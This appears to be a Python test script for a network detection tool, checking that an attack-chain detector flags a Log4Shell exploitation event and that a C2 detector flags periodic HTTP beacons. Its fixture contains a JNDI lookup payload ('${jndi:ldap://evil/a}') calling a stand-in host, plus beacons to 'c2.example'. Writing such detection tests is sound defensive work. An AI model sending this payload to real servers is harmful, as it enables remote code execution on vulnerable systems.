from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.correlation.attack_chain import detect_attack_stages
from src.correlation.c2_detector import detect_c2
from src.event.models import HttpEvent


def main() -> None:
    exploit = HttpEvent(
        event_id="evt-1",
        timestamp=1.0,
        src_ip="10.0.0.5",
        src_port=44444,
        dst_ip="10.0.0.10",
        dst_port=80,
        protocol="HTTP",
        payload_clean="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim",
        summary="jndi exploit",
        method="GET",
        uri="/?x=${jndi:ldap://evil/a}",
        host="victim",
        user_agent="curl",
        headers={},
    )
    stages = detect_attack_stages([exploit], [{"event_id": "evt-1", "cve": "CVE-2021-44228", "score": 0.9}])
    assert any(stage["stage"] == "Exploitation" for stage in stages)

    beacon_events = [
        HttpEvent(
            event_id=f"beacon-{idx}",
            timestamp=float(idx * 30),
            src_ip="10.0.0.20",
            src_port=50000 + idx,
            dst_ip="8.8.8.8",
            dst_port=8080,
            protocol="HTTP",
            payload_clean="GET /api/checkin HTTP/1.1 Host: c2.example User-Agent: agent",
            summary="checkin",
            method="GET",
            uri="/api/checkin",
            host="c2.example",
            user_agent="agent",
            headers={},
        )
        for idx in range(5)
    ]
    findings = detect_c2(beacon_events)
    assert findings
    assert findings[0]["c2_type"] == "HTTP Beacon"


if __name__ == "__main__":
    main()

